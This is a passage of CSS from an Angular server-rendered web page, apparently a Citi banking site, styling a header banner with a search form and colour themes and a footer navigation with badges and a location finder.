      width: 95px
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>citi-cta.showSpanishBg[_ngcontent-ssr-c135] button.open,
    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>citi-cta.showSpanishBg[_ngcontent-ssr-c135] button:focus,
    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>citi-cta.showSpanishBg[_ngcontent-ssr-c135] button:hover {
      background-color: rgba(0, 0, 0, .25)
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>citi-cta[_ngcontent-ssr-c135] {
      height: 100%
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>citi-cta[_ngcontent-ssr-c135] button {
      display: inline-block;
      line-height: 1;
      margin-right: 11px;
      border: none;
      height: 100%;
      width: 200px;
      right: -16px;
      position: relative
    }

    @media (max-width:768px) {
      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .logo[_ngcontent-ssr-c135] a[_ngcontent-ssr-c135] {
        height: 30px
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135]>citi-cta[_ngcontent-ssr-c135] button {
        background-size: 16px 16px
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .searchText[_ngcontent-ssr-c135] {
        display: none;
        margin-right: 10px;
        position: absolute;
        top: 20px;
        right: 39px;
        font-family: Interstate_Bold, sans-serif;
        color: #fff;
        font-size: 12px;
        pointer-events: none;
        font-weight: 700
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>citi-cta.showSpanishBg[_ngcontent-ssr-c135] button {
        width: 26px;
        margin-right: -19px;
        right: 35px;
        background-size: 16px 16px;
        height: 100%;
        background-position-x: 6px;
        position: relative
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>citi-cta[_ngcontent-ssr-c135] button {
        background-size: 16px 16px;
        height: 100%;
        background-position-x: 6px;
        position: relative;
        margin-right: 0;
        right: -6px
      }
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] {
      display: inline-flex;
      line-height: 1;
      white-space: nowrap;
      position: relative;
      z-index: 5;
      height: 50px
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] [_ngcontent-ssr-c135]:-moz-placeholder,
    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] [_ngcontent-ssr-c135]:-ms-input-placeholder,
    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] [_ngcontent-ssr-c135]::-moz-placeholder,
    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] [_ngcontent-ssr-c135]::-webkit-input-placeholder {
      color: #666;
      opacity: 1
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] {
      width: 250px
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] tr {
      border: none
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-input .gsc-input-box {
      border: none
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-input .gsc-input-box.gsc-input-box-focus,
    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-input .gsc-input-box.gsc-input-box-hover {
      box-shadow: none
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-input .gsc-input-box input.gsc-input {
      border: none;
      outline: 0;
      color: #666;
      background: #eee !important;
      text-indent: 0 !important;
      text-rendering: optimizeLegibility !important;
      -webkit-font-smoothing: antialiased !important;
      padding: 0 20px !important
    }

    @media (min-width:769px) {
      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-input .gsc-input-box input.gsc-input:focus {
        border: 2px solid #056dae !important
      }
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-input .gsc-input-box input.gsc-input::-ms-clear {
      display: none
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-input .gsc-input-box input.gsc-input:focus:placholder-shown {
      color: #333 !important
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-input .gsc-input-box input.gsc-input:focus::-webkit-input-placeholder {
      color: #333 !important
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-input .gsc-input-box input.gsc-input:focus::-moz-placeholder {
      color: #333 !important
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-input .gsc-input-box input.gsc-input:focus:-ms-input-placeholder {
      color: #333 !important
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-input .gsc-input-box input.gsc-input:focus:-moz-placeholder {
      color: #333 !important
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] .gsib_b,
    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-search-button {
      display: none
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] citi-cta[_ngcontent-ssr-c135] button {
      border: none;
      border-radius: 0;
      background-color: #056dae;
      color: #fff;
      font-family: Interstate_Bold, san-serif;
      height: 50px;
      width: 50px;
      min-width: auto;
      margin: 0;
      padding: 0;
      float: none
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] citi-cta[_ngcontent-ssr-c135] button:focus,
    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] citi-cta[_ngcontent-ssr-c135] button:hover {
      background-color: #002a54
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] citi-cta[_ngcontent-ssr-c135] button[type=reset] {
      width: 40px;
      padding: 0;
      background: url(../../images/catalogue/desktop-search-close-btn.png) center center/10px 10px no-repeat;
      border: none;
      position: absolute;
      right: 0;
      bottom: 0;
      margin-right: 0
    }

    @media all and (-ms-high-contrast:none),
    (-ms-high-contrast:active) {
      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] citi-cta[_ngcontent-ssr-c135] button[type=reset] {
        right: 10px
      }
    }

    @media (min-width:769px) {
      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] {
        transition: width 350ms ease-in-out;
        position: relative;
        top: 6px;
        right: 75px;
        overflow: hidden;
        width: 0;
        max-width: 300px;
        visibility: hidden
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .container[_ngcontent-ssr-c135] {
        display: inline-flex;
        line-height: 1;
        white-space: nowrap;
        padding-right: 0;
        padding-left: 0;
        position: absolute;
        z-index: 5;
        width: auto !important;
        height: 100%
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input.open[_ngcontent-ssr-c135] {
        width: 320px;
        max-width: 320px;
        transition: width 350ms ease-in-out;
        visibility: visible
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input.bump[_ngcontent-ssr-c135] {
        margin-right: 32px
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-input .gsc-input-box input.gsc-input {
        width: 250px !important;
        height: 50px !important;
        margin-top: 0 !important;
        padding-right: 35px !important;
        -webkit-appearance: none !important;
        border-radius: 0 !important
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] citi-cta[_ngcontent-ssr-c135] button[type=reset] {
        margin-right: 50px;
        right: 0
      }
    }

    @media (max-width:768px) {
      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] {
        width: 100%;
        display: none
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] {
        transition: height 350ms ease-in-out;
        position: absolute;
        left: 0;
        top: 55px;
        width: 100%;
        height: 0;
        overflow: hidden;
        border-bottom: 1px solid #eee
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .container[_ngcontent-ssr-c135] {
        width: auto !important;
        padding: 0
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input.open[_ngcontent-ssr-c135] {
        height: 50px;
        transition: height 350ms ease-in-out
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] .search-input[_ngcontent-ssr-c135] td.gsc-input .gsc-input-box input.gsc-input {
        width: 100% !important;
        height: 50px !important;
        padding-right: 40px !important;
        background-color: #fff !important;
        position: absolute !important;
        bottom: 0 !important
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] citi-cta[_ngcontent-ssr-c135] button {
        display: none
      }

      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .input[_ngcontent-ssr-c135] citi-cta[_ngcontent-ssr-c135] button[type=reset] {
        height: 50px;
        display: block
      }
    }

    .banner.blue[_ngcontent-ssr-c135] {
      background: linear-gradient(180deg, #00bdf2, #00b3f0 18%, #0066b3 77%, #004985)
    }

    .banner.gold[_ngcontent-ssr-c135] {
      background: linear-gradient(180deg, #b4975a, #a0864a 49%, #78622a 99%)
    }

    .banner.orange[_ngcontent-ssr-c135] {
      background: linear-gradient(180deg, #fcb314, #ff7200 99%)
    }

    .banner.white[_ngcontent-ssr-c135] {
      background-color: #fff
    }

    .banner.black[_ngcontent-ssr-c135] {
      background-color: #333
    }

    .banner.brown[_ngcontent-ssr-c135] {
      background-color: #281814
    }

    .banner.priority[_ngcontent-ssr-c135] {
      background-color: #0e2a48
    }

    .banner.priority[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .logo[_ngcontent-ssr-c135] a[_ngcontent-ssr-c135],
    .banner.white[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .logo[_ngcontent-ssr-c135] a[_ngcontent-ssr-c135] {
      position: initial
    }

    [_nghost-ssr-c135] citi-tooltip .tooltip-wrapper .tool-tip .wrapper.position-left {
      width: 380px !important;
      height: 70px;
      margin-top: 10px
    }

    [_nghost-ssr-c135] citi-tooltip .tooltip-pointer {
      margin-top: 20px
    }

    [_nghost-ssr-c135] citi-tooltip .trigger {
      background-image: none !important
    }

    #mobileLogo[_ngcontent-ssr-c135] {
      width: 115px;
      height: 40px;
      margin-left: -12px
    }
  </style>
  <style>
    .navigation[_ngcontent-ssr-c115] {
      background: #333;
      padding-bottom: 20px
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] {
      width: 100%;
      max-width: 1440px;
      margin: 0 auto;
      padding: 40px 6.667% 0;
      display: flex;
      justify-content: space-between
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] {
      width: 16.6666%;
      padding-right: 20px
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115]:last-child {
      padding-right: 0
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] .title[_ngcontent-ssr-c115] {
      color: #fff;
      font-family: Interstate_Bold, sans-serif;
      padding: 0;
      margin-top: 0;
      margin-bottom: 16px;
      background: 0 0;
      border: none;
      font-size: 14px;
      line-height: 24px;
      text-rendering: optimizeLegibility;
      -webkit-font-smoothing: antialiased
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section.open[_ngcontent-ssr-c115] button.title[_ngcontent-ssr-c115]:after {
      transition: 180ms linear;
      transform: rotate(-180deg)
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] button.title[_ngcontent-ssr-c115] {
      text-align: left;
      width: 100%;
      display: none
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] {
      margin: 0;
      padding: 0
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] li[_ngcontent-ssr-c115] {
      list-style-type: none;
      font-size: 12px;
      line-height: 18px
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] li[_ngcontent-ssr-c115] citi-cta[_ngcontent-ssr-c115] a,
    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] li[_ngcontent-ssr-c115] citi-cta[_ngcontent-ssr-c115] button {
      font-size: 12px;
      line-height: 18px;
      color: #fff;
      text-decoration: none;
      white-space: normal;
      text-align: left;
      padding-left: 0;
      margin-right: 0
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] li[_ngcontent-ssr-c115] citi-cta[_ngcontent-ssr-c115] a:hover,
    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] li[_ngcontent-ssr-c115] citi-cta[_ngcontent-ssr-c115] button:hover {
      text-decoration: underline
    }

    @media (max-width:990px) {
      .navigation[_ngcontent-ssr-c115] {
        padding-bottom: 0
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] {
        display: block;
        padding: 7px 5% 0
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] {
        width: 100%;
        padding-right: 20px;
        border-top: 1px solid #666
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] .title[_ngcontent-ssr-c115] {
        margin: 0;
        padding: 20px 0;
        position: relative
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] .title[_ngcontent-ssr-c115]:after {
        content: "";
        width: 20px;
        height: 20px;
        position: absolute;
        right: -15px;
        top: calc(50% - 10px);
        background: url() center center no-repeat;
        -webkit-tap-highlight-color: transparent;
        transition: 180ms linear;
        transform: rotate(0)
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] button.title[_ngcontent-ssr-c115] {
        padding-left: 0;
        padding-right: 0;
        display: block
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] {
        padding-left: 0;
        padding-right: 0;
        max-height: 0;
        overflow: hidden;
        transition: max-height 180ms ease-in-out
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] li[_ngcontent-ssr-c115] citi-cta[_ngcontent-ssr-c115] a,
      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] li[_ngcontent-ssr-c115] citi-cta[_ngcontent-ssr-c115] button {
        display: inline-block;
        padding: 10px 0
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] li[_ngcontent-ssr-c115] citi-cta[_ngcontent-ssr-c115] a:first-child,
      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] li[_ngcontent-ssr-c115] citi-cta[_ngcontent-ssr-c115] button:first-child {
        padding-top: 0
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115]:first-child,
      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115]:last-child {
        border: none
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section.last[_ngcontent-ssr-c115] {
        border-bottom: 1px solid #666
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] h3.title[_ngcontent-ssr-c115] {
        display: none
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section.open[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] {
        max-height: 500px;
        transition: max-height 180ms ease-in-out
      }
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] .images[_ngcontent-ssr-c115] {
      padding-top: 7px;
      float: right
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] .images[_ngcontent-ssr-c115] div[_ngcontent-ssr-c115] {
      float: left
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] .images[_ngcontent-ssr-c115] .equalHousing[_ngcontent-ssr-c115],
    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] .images[_ngcontent-ssr-c115] .fdic[_ngcontent-ssr-c115] {
      background-size: 70px;
      height: 30px;
      margin-right: 15px
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] .images[_ngcontent-ssr-c115] .equalHousing[_ngcontent-ssr-c115]:last-child,
    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] .images[_ngcontent-ssr-c115] .fdic[_ngcontent-ssr-c115]:last-child {
      margin-right: 0
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] .images[_ngcontent-ssr-c115] .fdic[_ngcontent-ssr-c115] {
      background-position: 0 79%;
      width: 49px
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] .images[_ngcontent-ssr-c115] .equalHousing[_ngcontent-ssr-c115] {
      background-position: 0 100%;
      width: 31.5px;
      margin-left: 15px
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] {
      line-height: 0;
      width: 16.6666%;
      padding-left: 20px;
      float: left
    }

    @media (max-width:990px) {
      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .section[_ngcontent-ssr-c115] .images[_ngcontent-ssr-c115] {
        float: none;
        margin-bottom: 42px
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] {
        width: 100%
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] img[_ngcontent-ssr-c115] {
        cursor: pointer
      }
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] .registerMark[_ngcontent-ssr-c115] {
      font-size: 12px
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115]:last-child {
      padding-right: 0
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] button[_ngcontent-ssr-c115] {
      padding: 0;
      border: none;
      margin-bottom: 2px
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] button[_ngcontent-ssr-c115]:focus {
      border: 1px dotted #fff !important
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] .appBadge0[_ngcontent-ssr-c115],
    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] .appBadge1[_ngcontent-ssr-c115] {
      height: 40px;
      width: 118px
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] button.jdpower[_ngcontent-ssr-c115] {
      background: 0 0
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] img.jdpowerimg[_ngcontent-ssr-c115] {
      height: 110px !important
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] .jdpowerlink[_ngcontent-ssr-c115]:hover {
      cursor: pointer
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] .jdpowerlink[_ngcontent-ssr-c115] {
      text-indent: 291px
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] .jdpowermp[_ngcontent-ssr-c115] {
      margin-bottom: -23px;
      display: inline
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] .jdpowermp[_ngcontent-ssr-c115]+a[_ngcontent-ssr-c115] {
      cursor: pointer
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] {
      margin-top: 5px;
      margin-bottom: 16px;
      margin-left: -48px
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] ul[_ngcontent-ssr-c115] img[_ngcontent-ssr-c115] {
      width: 118px;
      height: 40px;
      cursor: pointer
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] .title[_ngcontent-ssr-c115] {
      color: #fff;
      font-family: Interstate_Bold, sans-serif;
      padding: 0 5px 5px 0;
      margin-bottom: 0;
      background: 0 0;
      border: none;
      font-size: 14px;
      line-height: 24px;
      text-rendering: optimizeLegibility;
      -webkit-font-smoothing: antialiased
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .location-finder[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] h3[_ngcontent-ssr-c115] {
      color: #fff;
      font-family: Interstate_Bold, sans-serif;
      padding: 0 5px 16px 0;
      margin-bottom: 0;
      background: 0 0;
      border: none;
      font-size: 14px;
      line-height: 24px;
      text-rendering: optimizeLegibility;
      -webkit-font-smoothing: antialiased
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .location-finder[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] citi-form-container[_ngcontent-ssr-c115] form .form-group {
      margin-bottom: 0;
      float: none;
